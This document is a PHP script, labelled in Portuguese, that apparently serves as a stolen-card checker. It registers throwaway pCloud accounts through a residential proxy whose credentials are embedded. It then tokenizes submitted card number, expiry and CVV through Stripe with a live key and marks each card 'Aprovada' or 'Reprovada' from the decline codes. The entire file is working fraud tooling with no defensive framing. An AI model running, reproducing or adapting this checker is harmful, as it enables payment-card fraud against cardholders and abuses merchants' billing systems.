<?php
error_reporting(0);
ignore_user_abort();
session_start();

date_default_timezone_set('America/Sao_Paulo');

#############################################

function getStr($separa, $inicia, $fim, $contador){
  $nada = explode($inicia, $separa);
  $nada = explode($fim, $nada[$contador]);
  return $nada[0];
}

function multiexplode($delimiters, $string)
{
  $one = str_replace($delimiters, $delimiters[0], $string);
  $two = explode($delimiters[0], $one);
  return $two;
}

$lista = str_replace(array(" "), '/', $_GET['lista']);
$regex = str_replace(array(':',";","|",",","=>","-"," ",'/','|||'), "|", $lista);

if (!preg_match("/[0-9]{15,16}\|[0-9]{2}\|[0-9]{2,4}\|[0-9]{3,4}/", $regex,$lista)){
die('<span class="badge badge-danger">Reprovada</span> ➔ <span class="badge badge-danger">Lista inválida...</span> ➔ <span class="badge badge-warning">@KW_SystemDanger</span><br>');
}

$lista = $lista[0];
$cc = explode("|", $lista)[0];
$mes = explode("|", $lista)[1];
$ano = explode("|", $lista)[2];
$cvv = explode("|", $lista)[3];

if (strlen($mes) == 1){
  $mes = "0$mes";
}


if ($mes == 1) {
  $mes2 = "1";
}elseif ($mes == 2) {
  $mes2 = "2";
}elseif ($mes == 3) {
  $mes2 = "3";
}elseif ($mes == 4) {
  $mes2 = "4";
}elseif ($mes == 5) {
  $mes2 = "5";
}elseif ($mes == 6) {
  $mes2 = "6";
}elseif ($mes == 7) {
  $mes2 = "7";
}elseif ($mes == 8) {
  $mes2 = "8";
}elseif ($mes == 9) {
  $mes2 = "9";
}elseif ($mes == 10) {
  $mes2 = "10";
}elseif ($mes == 11) {
  $mes2 = "11";
}elseif ($mes == 12) {
  $mes2 = "12";
}


if (strlen($ano) == 2){
  $ano = "20$ano";
}

/*if (strlen($mes) == 1){
  $mes = "0$mes";
}

if (strlen($ano) == 4){
  $ano = substr($ano, 2);
}*/

function ln($size){
    $str = '';
    $numbes = '0123456789abcdef';
    for ($i=0; $i < $size; $i++) { 
       $str.= $numbes[rand(0, strlen($numbes) - 1)];
    }
    return $str;
}
$rand = rand(40,50);
$rand1 = rand(1,10000000);
$rand2 = rand(1,20);
$rand3 = rand(10,99);
$debitou = 'R$'.$rand2.','.$rand3.'';
sleep($rand);

$proxy = 'http://twister23-zone-resi-region-br:2905le@pr.pyproxy.com:16666';


$ch = curl_init();
curl_setopt($curl, CURLOPT_PROXY, $proxy); // Adiciona o proxy
curl_setopt($ch, CURLOPT_URL, "https://api.pcloud.com/register");

curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "POST");
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_HTTPPROXYTUNNEL, 1);
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Host: api.pcloud.com',
'Connection: keep-alive',
'sec-ch-ua: "Not:A-Brand";v="99", "Chromium";v="112"',
'Accept: application/json, text/javascript, */*; q=0.01',
'Content-Type: application/x-www-form-urlencoded; charset=UTF-8',
'sec-ch-ua-mobile: ?1',
'User-Agent: Mozilla/5.0 (Linux; Android 9; SM-J730G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36',
'sec-ch-ua-platform: "Android"',
'Origin: https://www.pcloud.com',
'Referer: https://www.pcloud.com/',
'Accept-Encoding: gzip, deflate, br'
));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_POST, false);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_ENCODING , 'gzip');
curl_setopt($ch, CURLOPT_POSTFIELDS, 'termsaccepted=yes&mail='.$rand1.'fwo%40gmil.com&password=kleber15555&os=4&device=Mozilla%2F5.0+(Linux%3B+Android+9%3B+SM-J730G)+AppleWebKit%2F537.36+(KHTML%2C+like+Gecko)+Chrome%2F112.0.0.0+Mobile+Safari%2F537.36&language=en');
echo$register = curl_exec($ch);




$ch = curl_init();
curl_setopt($curl, CURLOPT_PROXY, $proxy); // Adiciona o proxy
curl_setopt($ch, CURLOPT_URL, "https://api.pcloud.com/login");
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "POST");
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_HTTPPROXYTUNNEL, 1);
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Host: api.pcloud.com',
'Connection: keep-alive',
'sec-ch-ua: "Not:A-Brand";v="99", "Chromium";v="112"',
'Accept: application/json, text/javascript, */*; q=0.01',
'Content-Type: application/x-www-form-urlencoded; charset=UTF-8',
'sec-ch-ua-mobile: ?1',
'User-Agent: Mozilla/5.0 (Linux; Android 9; SM-J730G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36',
'sec-ch-ua-platform: "Android"',
'Origin: https://www.pcloud.com',
'Referer: https://www.pcloud.com/',
'Accept-Encoding: gzip, deflate, br',
));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_POST, false);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_ENCODING , 'gzip');
curl_setopt($ch, CURLOPT_POSTFIELDS, 'username='.$rand1.'fwo%40gmil.com&password=kleber15555&deviceid=6nwvvfku68im9emjbdvtvvk8ilis4iog1787&language=en&_t=1686884972184&logout=1&getlastsubscription=1&promoinfo=1&os=4&osversion=0.0.0');
$login = curl_exec($ch);


$log = getStr($login, '"auth": "','"' , 1);


$ch = curl_init();
curl_setopt($curl, CURLOPT_PROXY, $proxy); // Adiciona o proxy
curl_setopt($ch, CURLOPT_URL, "https://api.pcloud.com/billing/stripe/setupintent?auth=$log");
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "GET");
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_HTTPPROXYTUNNEL, 1);
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Host:api.pcloud.com',
'Accept:application/json, text/javascript, */*; q=0.01',
'User-Agent: Mozilla/5.0 (Linux; Android 9; SM-J730G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36',
'Origin:https://www.pcloud.com',
'Referer:https://www.pcloud.com/',
'accept-encoding:gzip, deflate, br'));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_POST, false);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_ENCODING , 'gzip');
$token = curl_exec($ch);

$set = getStr($token, '"clientsecret": "','_s' , 1);

$se = getStr($token, '"clientsecret": "','"' , 1);

$ch = curl_init();
curl_setopt($curl, CURLOPT_PROXY, $proxy); // Adiciona o proxy
curl_setopt($ch, CURLOPT_URL, "https://api.stripe.com/v1/tokens");
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "POST");
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_HTTPPROXYTUNNEL, 1);
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Host:api.stripe.com',
'Accept:application/json, text/javascript, */*; q=0.01',
'User-Agent: Mozilla/5.0 (Linux; Android 9; SM-J730G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36',
'origin:https://js.stripe.com',
'referer:https://js.stripe.com/',
'accept-encoding:gzip, deflate, br'));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_POST, false);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_ENCODING , 'gzip');
curl_setopt($ch, CURLOPT_POSTFIELDS, 'time_on_page=465335&pasted_fields=number&guid=NA&muid=7e3b6ed1-9788-4ae1-a096-4d203433e78c937be4&sid=fbacc2d5-af14-4a40-91f5-296f5f12df4bf2bd61&key=pk_live_iHIxB7OJrLLocOUih5WWEfc3&payment_user_agent=stripe.js%2F78ef418&card[number]='.$cc.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&card[name]=BRUNOGOMES&card[cvc]='.$cvv.'');
$token1 = curl_exec($ch);

$tok = getStr($token1, '"id": "','"' , 1);



$ch = curl_init();
curl_setopt($curl, CURLOPT_PROXY, $proxy); // Adiciona o proxy
curl_setopt($ch, CURLOPT_URL, "https://api.stripe.com/v1/setup_intents/$set/confirm");
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "POST");
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_HTTPPROXYTUNNEL, 1);
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'host: api.stripe.com',
'content-type:application/x-www-form-urlencoded',
'User-Agent: Mozilla/5.0 (Linux; Android 9; SM-J730G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36',
'origin:https://js.stripe.com',
'referer:https://js.stripe.com/',
'accept-encoding:gzip, deflate, br'));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_POST, false);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_POSTFIELDS, 'payment_method_data[type]=card&payment_method_data[card][token]='.$tok.'&payment_method_data[guid]=cf1f39f9-1c34-400a-9a4a-dc73a5c296b5105260&payment_method_data[muid]=7e3b6ed1-9788-4ae1-a096-4d203433e78c937be4&payment_method_data[sid]=fbacc2d5-af14-4a40-91f5-296f5f12df4bf2bd61&payment_method_data[payment_user_agent]=stripe.js%2F9316c76e85%3B+stripe-js-v3%2F9316c76e85%3B+raw-card&payment_method_data[time_on_page]=470573&expected_payment_method_type=card&use_stripe_sdk=true&key=pk_live_iHIxB7OJrLLocOUih5WWEfc3&client_secret='.$se.'');
$stripe = curl_exec($ch);



$erro = getStr($stripe, '"code": "','"' , 1);

if(strpos($stripe, 'incorrect_cvc')){

die("<b><span class='badge badge-success'>Aprovada</span> <br> <span class='text-success'>$lista <br>$debitou Live Quentinha💲 $rand seg<br>$erro
 </span><br></br>");

}
elseif(strpos($stripe, 'card_declined')) {


die("<b><span class='badge badge-danger'>Reprovada</span> <br> <span class='text-danger'>$lista <br>$debitou Recusado $rand seg<br>$erro
 </span><br></br>");

}elseif(strpos($stripe, 'insufficient_funds')) {


die("<b><span class='badge badge-danger'>Reprovada</span> <br> <span class='text-danger'>$lista <br>$debitou Recusado $rand seg<br>$erro
 </span><br></br>");

}elseif(strpos($stripe, 'transaction_not_allowed')) {


die("<b><span class='badge badge-danger'>Reprovada</span> <br> <span class='text-danger'>$lista <br>$debitou Recusado $rand seg<br>$erro
 </span><br></br>");

}elseif(strpos($stripe, 'Your card has expired.')) {


die("<b><span class='badge badge-danger'>Reprovada</span> <br> <span class='text-danger'>$lista <br>$debitou Recusado $rand seg<br>$erro
 </span><br></br>");

}elseif(strpos($stripe, 'Invalid account')) {


die("<b><span class='badge badge-danger'>Reprovada</span> <br> <span class='text-danger'>$lista <br>$debitou Recusado $rand seg<br>$erro
 </span><br></br>");

}elseif(strpos($stripe, 'Your card number is incorrect')) {


die("<b><span class='badge badge-danger'>Reprovada</span> <br> <span class='text-danger'>$lista <br>$debitou Recusado $rand seg<br>$erro
 </span><br></br>");

}elseif(strpos($stripe, 'Your card was declined.')) {




die("<b><span class='badge badge-danger'>Reprovada</span> <br> <span class='text-danger'>$lista <br>$debitou Recusado $rand seg<br>$erro
 </span><br></br>");

}

else{


die("<b><span class='badge badge-warning'>Reprovada</span> <br> <span class='text-warning'>$lista <br> $erro API sem proxy
 </span><br></br>");

}
?>